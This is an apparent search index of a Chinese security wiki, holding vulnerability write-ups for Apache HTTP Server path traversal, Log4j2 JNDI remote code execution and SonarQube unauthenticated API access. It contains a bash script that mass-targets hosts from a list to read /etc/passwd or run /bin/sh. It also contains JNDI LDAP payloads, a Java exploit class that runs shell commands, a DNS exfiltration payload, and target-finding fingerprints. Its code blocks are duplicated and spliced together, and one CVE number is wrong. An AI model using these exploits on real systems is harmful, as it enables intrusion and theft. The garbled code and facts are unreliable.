{"./":{"url":"./","title":"Introduction","keywords":"","body":"/| .--. .--. . .--. || |__| _ _ |__| .'| |__| || .--. .| /\\ \\\\ // .--. .' | .--. || __ | | .' |_ `\\\\ //\\\\ // | | A permanently free and open source knowledge base for cyber security | 一个永久免费 、开源的网络安全知识库 "},"杂七杂八/工具推荐/":{"url":"杂七杂八/工具推荐/","title":"工具推荐","keywords":"","body":" 该目录内包含了一系列实战阶段，常用且好用的工具。欢迎各位按照习惯使用&补充 /| .--. .--. . .--. || |__| _ _ |__| .'| |__| || .--. .| /\\ \\\\ // .--. .' | .--. || __ | | .' |_ `\\\\ //\\\\ // | | "},"杂七杂八/工具推荐/信息收集.html":{"url":"杂七杂八/工具推荐/信息收集.html","title":"信息收集","keywords":"","body":"CertEagle - 使用实时 CT 日志提要的资产监控实用程序 Aquatone - 一种跨大量主机的网站视觉截图检查工具，可以方便地快速了解基于 HTTP 的攻击面。 ffuf - 一款支持高并发的Fuzz工具 "},"杂七杂八/提交模板/":{"url":"杂七杂八/提交模板/","title":"提交模板","keywords":"","body":" 该目录内包含了一系列提交文章所用到的模板，请自行寻找适用于自己的模板，修改内容后打包发送至邮箱: team@onebit.tk /| .--. .--. . .--. || |__| _ _ |__| .'| |__| || .--. .| /\\ \\\\ // .--. .' | .--. || __ | | .' |_ `\\\\ //\\\\ // | | "},"杂七杂八/提交模板/漏洞文库模板.html":{"url":"杂七杂八/提交模板/漏洞文库模板.html","title":"漏洞文库模板","keywords":"","body":"CVE-xxx-xxx-xxx | xx >= 2.5.2 存在xxx漏洞 标题 格式为:CVE编号 | 版本简述、漏洞类型 0x00 漏洞说明 此段落简单明确的描写漏洞产生的影响 在Apache HTTP Server x.x.x.x 中对路径规范化所做的更改中发现了一个缺陷。攻击者可以使用路径遍历攻击穿越到服务器目录以外。在开启CGI配置后，将会从目录穿越 / 信息泄露升级为RCE。 0x01 影响版本 此段落描写受漏洞影响的软件版本 == Apache HTTP Server x.x.x.x 0x02 漏洞成因 此段落简明描写漏洞是由什么原因造成的，是哪个函数引发的漏洞等 由于在Apache HTTP Server x.x.x升级到 Apache HTTP Server x.x.x时，对路径规范化所做的更改中出现漏洞，该漏洞是由于 server/util.c\\ 中的 ap_normalize_path\\ 函数 一次解析一个 Unicode 值并在所有字符都被解码之前尝试检测遍历逻辑导致的。 当攻击者在 URL 中使用 /.%2e/\\ 时，第 572 行的逻辑不会将 %2e\\ 识别为句号，此时该字符尚未被解码。但该版本Apache HTTP Servers并没有在这种情况下将整体URL进行解码并匹配目录穿越过滤，导致 /.%2e/ 被 直接代入传递，导致目录穿越。 该漏洞默认配置情况下只存在目录遍历，但开启不受限制的 mod_cgi\\ 功能将会造成RCE 0x03 漏洞代码 此段落贴出该系统漏洞所在的代码块与文件目录，由于本文库使用了插件，可以在代码块上方使用 !FILENAME 的格式撰写 ，尽量不使用图片，图片或代码块下方可以简单描述 server/util.c # server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } 0x04 详细分析 该段落主要撰写详细分析漏洞存在的原因，例如什么函数导致了什么 当攻击者在 URL 中使用 /.%2e/\\ 时，第 572 行的逻辑不会将 %2e\\ 识别为句号，此时该字符尚未被解码。但该版本Apache HTTP Servers并没有在这种情况下将整体URL进行解码并匹配目录穿越过滤，导致 /.%2e/ 被 直接代入传递，导致目录穿越，具体如下: server/util.c /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) #上面的代码错误判断了目录穿越的payload，&& 判断只有在目录.的后面跟的是/或者空的时候才会触发次规则，并且没有解URL编码的%2e传入后并不会对%2e解码进行回溯验证，也不会对整体URL进行解码匹配，而是只识别了%,2,e #define IS_SLASH(s) (s == '/') #define IS_SLASH_OR_NUL(s) (s == '\\0' || IS_SLASH(s)) 0x05 漏洞指纹 该段落主要用于描写漏洞指纹或者特征截图,可选 fofa: title=\"apache\" 0x06 POC & EXP 主要存放一些用于该漏洞的EXP & POC，可以是漏洞复现，但要求尽量少用图片的方式，精简内容，比如截图漏洞点，文本描述漏洞复现经过，粘贴burp数据包等 exp.sh # Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal # Date: 10/05/2021 # Exploit Author: Lucas Souza https://lsass.io # Vendor Homepage: https://apache.org/ # Version: 2.4.49 # Tested on: 2.4.49 # CVE : CVE-2021-41773 # Credits: Ash Daulton and the cPanel Security Team #!/bin/bash if [[ $1 =3D=3D '' ]]; [[ $2 =3D=3D '' ]]; then echo Set [TAGET-LIST.TXT] [PATH] echo ./PoC.sh targets.txt /etc/passwd exit fi for host in $(cat $1); do curl --silent --path-as-is --insecure \"$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2\"; done # PoC.sh targets.txt /etc/passwd # PoC.sh targets.txt /bin/sh whoami 0x07 进阶利用思路 该段落描写一些自我理解和实战环境中的进阶利用思路 在特殊情况下可对网页配置文件进行读取，发现数据库连接密码等铭感信息 可使用bash直接反弹shell 0x08 冗余项 此段落不限制段落数量，根据需求添加 0x09 扩展链接 此段落主要撰写扩展阅读链接，以及详细分析该漏洞的文章等 Apache Httpd Cve 2021 41773 And Cve 2021 42013 漏洞详细分析 0x10 联系方式 此段落主要撰写该文章的联系方式，在审核结束后会根据作者意愿保留 / 删除 作者 : BitWiki支持团队 "},"漏洞文库/Apache/":{"url":"漏洞文库/Apache/","title":"Apache","keywords":"","body":"Apache软件基金会，是专门为支持开源软件项目而办的一个非营利性组织。在它所支持的Apache项目与子项目中，所发行的软件产品都遵循Apache许可证。 "},"漏洞文库/Apache/Log4j2/":{"url":"漏洞文库/Apache/Log4j2/","title":"Log4j2","keywords":"","body":"Apache Log4j 2是Log4j的升级版，与它的前身Log4j 1.x相比有了很大的改进，并提供了Logback中的许多改进，同时修复了Logback架构中的一些固有问题。 "},"漏洞文库/Apache/Log4j2/CVE-2021-44428  log4j2  2.14.x 存在JNDI RCE漏洞.html":{"url":"漏洞文库/Apache/Log4j2/CVE-2021-44428  log4j2  2.14.x 存在JNDI RCE漏洞.html","title":"CVE 2021 44428  Log4j2  2.14.X 存在JNDI RCE漏洞","keywords":"","body":"CVE-2021-44428 | log4j2 >= 2.14.x 存在JNDI RCE漏洞 0x00 漏洞说明 Apache Log4j2 版本 2.14.x 及以下版本存在远程代码执行漏洞。攻击者可在任何可记录在日志消息的参数中进行 JNDI 注入。当启用消息查找替换时，攻击者可以控制日志消息或日志消息的参数并执行从 LDAP 服务器加载的任意代码。 0x01 影响版本 0x02 漏洞成因 LogManager.getLogger().error() 与 LogManager.getLogger().fatal() 默认情况下记录错误日志，并经过递归拼接最终进入lookup方法，导致JNDI注入 0x03 漏洞代码 MessagePatternConverter.format @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i MessagePatternConverter.format @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i MessagePatternConverter.format @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i !FILENAME MessagePatternConverter.format @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } #39; && workingBuilder.charAt(i + 1) == '{') { // 这个value是：${jndi:ldap://127.0.0.1:1389/badClassName} final String value = workingBuilder.substring(offset, workingBuilder.length()); workingBuilder.setLength(offset); // 跟入replace方法 workingBuilder.append(config.getStrSubstitutor().replace(event, value)); } } } if (doRender) { textRenderer.render(workingBuilder, toAppendTo); } return; } if (msg != null) { String result; if (msg instanceof MultiformatMessage) { result = ((MultiformatMessage) msg).getFormattedMessage(formats); } else { result = msg.getFormattedMessage(); } if (result != null) { toAppendTo.append(config != null && result.contains(\"${\") ? config.getStrSubstitutor().replace(event, result) : result); } else { toAppendTo.append(\"null\"); } } }# server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } #39; && workingBuilder.charAt(i + 1) == '{') { // 这个value是：${jndi:ldap://127.0.0.1:1389/badClassName} final String value = workingBuilder.substring(offset, workingBuilder.length()); workingBuilder.setLength(offset); // 跟入replace方法 workingBuilder.append(config.getStrSubstitutor().replace(event, value)); } } } if (doRender) { textRenderer.render(workingBuilder, toAppendTo); } return; } if (msg != null) { String result; if (msg instanceof MultiformatMessage) { result = ((MultiformatMessage) msg).getFormattedMessage(formats); } else { result = msg.getFormattedMessage(); } if (result != null) { toAppendTo.append(config != null && result.contains(\"${\") ? config.getStrSubstitutor().replace(event, result) : result); } else { toAppendTo.append(\"null\"); } } }# server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } #39; && workingBuilder.charAt(i + 1) == '{') { // 这个value是：${jndi:ldap://127.0.0.1:1389/badClassName} final String value = workingBuilder.substring(offset, workingBuilder.length()); workingBuilder.setLength(offset); // 跟入replace方法 workingBuilder.append(config.getStrSubstitutor().replace(event, value)); } } } if (doRender) { textRenderer.render(workingBuilder, toAppendTo); } return; } if (msg != null) { String result; if (msg instanceof MultiformatMessage) { result = ((MultiformatMessage) msg).getFormattedMessage(formats); } else { result = msg.getFormattedMessage(); } if (result != null) { toAppendTo.append(config != null && result.contains(\"${\") ? config.getStrSubstitutor().replace(event, result) : result); } else { toAppendTo.append(\"null\"); } } }# server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } 0x04 详细分析 在了解了相关漏洞情报和查看了相关补丁更改记录可以得出，该漏洞是通过jndi中LDAP注入的方式导致了RCE，并在对lookup函数进行了判断修改后又限制了jndi对LDAP的访问 翻阅官方文档中关于lookup的说明 Lookups provide a way to add values to the Log4j configuration at arbitrary places. They are a particular type of Plugin that implements the StrLookup interface. Information on how to use Lookups in configuration files can be found in the Property Substitution section of the Configuration page. lookup 提供了⼀种在任意位置向 Log4j2 配置添加值的⽅法，是实现 StrLookup 接⼝的特殊类型 的插件。 且 log4j支持的方法： base64 、 data 、 ctx 、 main 、 env 、 sys 、 sd 、 java 、 marker 、 jndi 、 jvmrunargs 、 map 、 bundle 、 log4j 在官方文档中给出了JNDI lookup的用法说明 JndiLookup 允许通过 JNDI 检索变量。默认情况下，该键将以 java:comp/env/ 为前缀，但是如果该键包含“:”，则不会添加前缀。 %d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n 在Log4j 2.17.0之前存在漏洞的版本中，默认存在漏洞，且支持ldap协议，在之后需要设置enableJndiLookup且只支持java协议 实际上log4j中jndi的用法格式为: ${jndi:JNDIContent} 既然明确了漏洞出发的方法，那么就要去找入口点: LogManager.getLogger().xxxx() 方法便是传入jndi语句的入口点 在log4j中，共有8个日志级别，可以通过 LogManager.getLogger() 调用记录日志的方法如 下： LogManager.getLogger().error() LogManager.getLogger().fatal() LogManager.getLogger().trace() LogManager.getLogger().traceExit() LogManager.getLogger().traceEntry() LogManager.getLogger().info() LogManager.getLogger().warn() LogManager.getLogger().debug() LogManager.getLogger().log() LogManager.getLogger().printf() 在默认情况下，error()和fatal()方法可以触发漏洞，其余方法需要令行配置，并且可以通过isInfoEnabled()和其他函数检查状态: 原因是在logIfEnabled方法中，对当前日志等级进行了一次判断: 该方法返回一个布尔值，只有在当前事件的日志等级大于或等于设置的日志等级时，才会符合条件，当返回值为 True 时，将继续 logMessage() 方法。 这里拿error举例说明: Logger logger = LogManager.getLogger(); logger.error(\"error message: {}\",${jndi:rmi:///}); 查看error的类继承关系可以发现，实际上被调用的是 AbstractLogger.java 中的 public void eror() 方法 当消息进入到error()方法时，会传入到logIfEnabled()中进行逻辑判断日志等级 当isEnabled()返回True后，将会继续logMessage()方法 logMessage() 调用 logMessageSafely()： ogMessageSafely() 调用 logMessageTrackRecursion() logMessageTrackRecursion() 调用 tryLogMessage() private void tryLogMessage(final String fqcn, final StackTraceElement location, final Level level, final Marker marker, final Message message, final Throwable throwable) { try { log(level, marker, fqcn, location, message, throwable); } catch (final Exception e) { handleLogMessageException(e, fqcn, message); } } 不动态调试的情况下跟log方法会到AbstractLogger.log方法，实际上这里是org.apache.logging.log4j.core.Loggger.log方法 @Override protected void log(final Level level, final Marker marker, final String fqcn, final StackTraceElement location, final Message message, final Throwable throwable) { final ReliabilityStrategy strategy = privateConfig.loggerConfig.getReliabilityStrategy(); if (strategy instanceof LocationAwareReliabilityStrategy) { // 触发点 ((LocationAwareReliabilityStrategy) strategy).log(this, getName(), fqcn, location, marker, level, message, throwable); } else { strategy.log(this, getName(), fqcn, marker, level, message, throwable); } } 跟入这里的log方法到org/apache/logging/log4j/core/config/DefaultReliabilityStrategy.log @Override public void log(final Supplier reconfigured, final String loggerName, final String fqcn, final StackTraceElement location, final Marker marker, final Level level, final Message data, final Throwable t) { loggerConfig.log(loggerName, fqcn, location, marker, level, data, t); } 进入LoggerConfig.log方法 @PerformanceSensitive(\"allocation\") public void log(final String loggerName, final String fqcn, final StackTraceElement location, final Marker marker, final Level level, final Message data, final Throwable t) { // 无需关心的代码 ... try { // 跟入 log(logEvent, LoggerConfigPredicate.ALL); } finally { ReusableLogEventFactory.release(logEvent); } } LoggerConfig另一处重载log方法 protected void log(final LogEvent event, final LoggerConfigPredicate predicate) { if (!isFiltered(event)) { // 跟入 processLogEvent(event, predicate); } } processLogEvent private void processLogEvent(final LogEvent event, final LoggerConfigPredicate predicate) { event.setIncludeLocation(isIncludeLocation()); if (predicate.allow(this)) { // 关键点 callAppenders(event); } logParent(event, predicate); } 可以看到调用appender.control的callAppenders方法 @PerformanceSensitive(\"allocation\") protected void callAppenders(final LogEvent event) { final AppenderControl[] controls = appenders.get(); //noinspection ForLoopReplaceableByForEach for (int i = 0; i 层层跟入到AppenderControl.tryCallAppender方法 private void callAppender0(final LogEvent event) { ensureAppenderStarted(); if (!isFilteredByAppender(event)) { // 跟入 tryCallAppender(event); } } private void tryCallAppender(final LogEvent event) { try { // 跟入 appender.append(event); } catch (final RuntimeException error) { handleAppenderError(event, error); } catch (final Exception error) { handleAppenderError(event, new AppenderLoggingException(error)); } } 进入AbstractOutputStreamAppender.append方法，进入到directEncodeEvent方法 protected void directEncodeEvent(final LogEvent event) { getLayout().encode(event, manager); if (this.immediateFlush || event.isEndOfBatch()) { manager.flush(); } } 关注其中的encode方法跟入到PatternLayout.encode方法 @Override public void encode(final LogEvent event, final ByteBufferDestination destination) { if (!(eventSerializer instanceof Serializer2)) { super.encode(event, destination); return; } final StringBuilder text = toText((Serializer2) eventSerializer, event, getStringBuilder()); final Encoder encoder = getStringBuilderEncoder(); encoder.encode(text, destination); trimToMaxSize(text); } 不用关心 encode 方法中多余的代码，这里触发点在toText方法 private StringBuilder toText(final Serializer2 serializer, final LogEvent event, final StringBuilder destination) { return serializer.toSerializable(event, destination); } 从toText中转入toSerializable @Override public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) { final int len = formatters.length; for (int i = 0; i 这里的formatters方法包含了多个formatter对象，其中出发漏洞的是第8个，其中包含MessagePatternConverter 跟入看到调用了Converter相关的方法 public void format(final LogEvent event, final StringBuilder buf) { if (skipFormattingInfo) { converter.format(event, buf); } else { formatWithInfo(event, buf); } } 不难看出每个formatter和converter为了构造日志的每一部分，这里在构造真正的日志信息字符串部分 跟入MessagePatternConverter.format方法，看到核心的部分 @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i 上面的步骤其实是一环套一环，排除一些不关键的调用路径，过程如下: logMessage > logMessageSafely > logMessageTrackRecursion > tryLogMessage > log > DefaultReliabilityStrategy.log > loggerConfig.log > processLogEvent > callAppenders > tryCallAppender > append > tryAppend > directEncodeEvent > encode > toText > toSerializable > format > PatternFormatter.format 第一个关键点在上文中 PatternFormatter.java 中的 format 方法: 红框标记内容为: 如果 config 不为 null，并且 nolookups 变量设置为 false，它将继续检查字符串是否以 ${ 开头（ 如果递归检测到 $ 字符后跟了一个 { 字符，那么会对直到 } 中间的内容进行解析） 红框上方的内容: if (config != null && !noLookups) 如果config 不为 null ，并且 nolookups 变量设置为 false，才会继续 ${ 字符串检查 那么nsLookups又是从何而来? 这是一个布尔值，它取决于 Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 和 noLookupsIdx >= 0 noLookupsIdx 来自 loadNoLookups(options) NOLOOKUPS 是一个常数 由于没有提供 loadNoLookups()中所需的options loadNoLookups() 将返回 -1，这使得 noLookupsIdx >= 0 为 false。 那么常量来自属性值： 再看下面那行 workingBuilder.append(config.getStrSubstitutor().replace(event, value)); 进入StrSubstitutor.replace方法 public String replace(final LogEvent event, final String source) { if (source == null) { return null; } final StringBuilder buf = new StringBuilder(source); // 跟入 if (!substitute(event, buf, 0, source.length())) { return source; } return buf.toString(); } 跟入StrSubstitutor.substitute方法，存在递归，逻辑较长,主要作用是递归处理日志输入，转为对应的输出 private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length, List priorVariables) { ... substitute(event, bufName, 0, bufName.length()); ... String varValue = resolveVariable(event, varName, buf, startPos, endPos); ... int change = substitute(event, buf, startPos, varLen, priorVariables); } 在这里要说一下，触发漏洞的必要条件其实就是此章节最上头写的那些: Logger logger = LogManager.getLogger(); logger.error(\"error message: {}\",${jndi:rmi:///}); 通常程序员会写下这样的日志代码，去记录一些错误日志，当攻击方输入恶意payload后，将会使变量进行更改，类似 logger.error(\"error_message:${jndi:ldap://127.0.0.1:1389/badClassName}\"); 而StrSubstitutor.substitute的递归将使jndi:ldap://127.0.0.1:1389/badClassName进入resolveVariable 方法 经过调试确认了关键方法resolveVariable protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) { final StrLookup resolver = getVariableResolver(); if (resolver == null) { return null; } // 进入 return resolver.lookup(event, variableName); } 接下来进入了最关键的lookup()方法: @Override public String lookup(final LogEvent event, String var) { if (var == null) { return null; } final int prefixPos = var.indexOf(PREFIX_SEPARATOR); if (prefixPos >= 0) { final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US); final String name = var.substring(prefixPos + 1); // 关键 final StrLookup lookup = strLookupMap.get(prefix); if (lookup instanceof ConfigurationAware) { ((ConfigurationAware) lookup).setConfiguration(configuration); } String value = null; if (lookup != null) { // 这里的name是：ldap://127.0.0.1:1389/badClassName value = event == null ? lookup.lookup(name) : lookup.lookup(event, name); } if (value != null) { return value; } var = var.substring(prefixPos + 1); } if (defaultLookup != null) { return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var); } return null; } 其中画框重点的 strLookupMap 包含以下值(内置方法)： 如果匹配到内置方法，那么就进入对应的处理方法，这里是 JNDI 方法，那么就会由JndiLookup类进一步处理 最终加载由攻击者传入的LDAP服务端地址，然后返回一个恶意的 JNDI Reference对象，触发漏 洞，实现 RCE 0x05 漏洞指纹 fofa: app=\"log4j2\" 0x06 POC & EXP !FILENAME exp.java public class Exploit { static { try { String command = \"touch /tmp/exploit.txt\"; // String[] commands = {\"bash\", \"-c\", command}; // System.out.println(\"cmd : \"+ commands[0]); int result = java.lang.Runtime.getRuntime().exec(commands).waitFor(); System.out.println(\"result : \"+ result); } catch (Exception e){ e.printStackTrace(); } } public static void main(String[] args) throws InterruptedException { new Exploit(); } } 0x07 进阶利用思路 DNS信息外带 !FILENAME POC ${jndi:ldap://${sys:java.version}.xxxx.dnslog.cn} 0x08 扩展链接 https://n0b1ta.github.io/CVE-2021-44228-Apache-Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83 https://security.tencent.com/index.php/blog/msg/131 https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/ https://xz.aliyun.com/t/10649 https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/ https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/ https://www.youtube.com/watch?v=Y8a5nB-vy78 0x9 联系方式 作者 : BitWiki支持团队 "},"漏洞文库/SonarQube/":{"url":"漏洞文库/SonarQube/","title":"SonarQube","keywords":"","body":"SonarQube（原Sonar）[3]是SonarSource开发的一个开源平台，用于持续检查代码质量，通过静态分析代码执行自动审查，以检测20 多种编程语言上的错误、代码异味和安全漏洞。SonarQube 提供关于重复代码、编码标准、单元测试、代码覆盖率、代码复杂性、注释)、错误的报告。, 和安全漏洞。 "},"漏洞文库/SonarQube/CVE-2020-27986 SonarQube 小于 8.4.2.x 存在API未授权访问漏洞.html":{"url":"漏洞文库/SonarQube/CVE-2020-27986 SonarQube 小于 8.4.2.x 存在API未授权访问漏洞.html","title":"CVE 2020 27986 SonarQube 小于 8.4.2.X 存在API未授权访问漏洞","keywords":"","body":"CVE-2020-27986 | SonarQube 0x00 漏洞说明 在SonarQube 0x01 影响版本 SonarQube 0x02 漏洞成因 由于平台管理者未对默认的权限配置文件进行修改，导致API对外开放访问，且未对API使用进行有效的身份认证，导致执行高危操作，最终泄露平台托管的全部源代码、用户等敏感信息 0x03 详细分析 经过测试，以下API列表均可以在默认配置的情况下进行访问 #共57条 /api/ce/component /api/ce/task /api/ce/task_types /api/components/app /api/components/search /api/components/search_projects /api/components/suggestions /api/components/tree /api/duplications/show /api/emails/send /api/issues/changelog /api/issues/search /api/measures/component /api/measures/component_tree /api/measures/search /api/measures/search_history /api/metrics/search /api/metrics/search /api/metrics/types /api/navigation/component /api/navigation/global /api/navigation/settings /api/organizations/search /api/organizations/search_members /api/project_badges/measure /api/project_badges/quality_gate /api/project_branches/list /api/project_tags/search /api/project_tags/search /api/qualitygates/list /api/qualitygates/show?id=1 /api/qualityprofiles/importers /api/qualityprofiles/inheritance /api/qualityprofiles/search /api/qualityprofiles/show /api/rules/list /api/rules/repositories /api/rules/search /api/rules/show /api/rules/tags /api/rules/update /api/server/version /api/settings/list_definitions /api/settings/values /api/sources/index /api/sources/raw /api/sources/show /api/system/db_migration_status /api/system/migrate_db /api/system/status /api/system/upgrades /api/users/current /api/users/identity_providers /api/users/search /api/webservices/list /api/webservices/response_example /batch/project 其中有几个值得注意的API接口: PATH Description Response Contents Request Parameters 1 Request Parameters 2 Request Parameters 3 Availability after fix /api/server/version 返回应用的版本号 应用版本号 √ /api/settings/values 列出一些设定的值 可能会返回一些敏感信息，但是几率不大 × /api/users/search 列出活跃的用户 泄露几乎所有的用户列表，可以用于密码爆破 × /api/webservices/list 列出网络服务 返回一些api目录和api的详细信息 × /api/components/search_projects 搜索项目 返回敏感信息：organization、Project(ID)、Project(Key)等 × /api/components/tree 根据所选策略浏览组件 返回大量敏感信息：File(Key)、Project(Key)、Project(ID)等 component：Project(Key) componentId：Project(ID) × /api/emails/send 通过发送电子邮件测试电子邮件配置 需要先进行认证，但是认证成功后可以利用配置的邮箱进行钓鱼等横向操作 message：邮件内容 subject：邮件标题 to：目标邮箱 × /api/issues/search 阅读和更新Issues 返回敏感大量信息：issues(key)、File Key(Key)、project(Key)、author(Email)、与其他issues内容信息 × /api/issues/changelog 显示Issues的变更日志 如果有Issues的变更记录则返回 issue：Issue(key) × /api/measures/component_tree 获取具有指定度量的组件或子项 返回大量敏感信息：Project(ID)、File(Key)文件名等 metricKeys：ncloc,complexity,violations component：Project(Key) baseComponentId：Project(ID) × /api/navigation/component 获取有关当前用户的组件导航的信息。 返回少量敏感信息：project(Key)、organization、Project(ID)等 component：Project(Key) × /api/rules/list 列出规则，不包括手动规则和状态为 REMOVED 的规则 返回相关API规则信息 × /api/settings/list_definitions 列出API的设置定义 返回相关API定义内容 × /batch/project 返回项目存储库 返回指定项目中所有的存储库和文件目录以及其他敏感信息 key：Project(Key) × /api/sources/raw 以原始文本形式获取源代码 以原始文本形式获取指定文件的源代码(重点) key:File(Key) × /api/sources/index 获取源代码 获取指定文件的源代码(重点) key:File(Key) × /api/sources/show 以行号/文本对的形式获取源代码 以行号/文本对的形式获取指定文件的源代码(重点) key:File(Key) × 以下是一些参数的对应内容: API 上表对应值 API返回键 注释 /api/components/search_projects organization organization 所属组织名称 /api/components/search_projects Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/components/search_projects Project(Key) key 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/components/search_projects File(Key) key 后期参数需要的key，其格式为:: /api/components/tree File(Key) component 后期参数需要的key，其格式为:: /api/components/tree Project(Key) project 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/components/tree Project(ID) key 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/issues/search issues(key) key 标识每个issues，每个回复每个问题都有一个 /api/issues/search File (Key) component 后期参数需要的key，其格式为:: /api/issues/search Project(Key) project 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/issues/search author(Email) author 发起此issues的用户邮箱，可用于钓鱼 /api/measures/component_tree Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/measures/component_tree File(Key) key 后期参数需要的key，其格式为::，但是该API存在项目名(根目录) /api/navigation/component project(Key) key 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/navigation/component organization organization 所属组织名称 /api/navigation/component Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 0x05 漏洞指纹 fofa: app=\"sonarQube-代码管理\" 0x04 POC & EXP POC crul 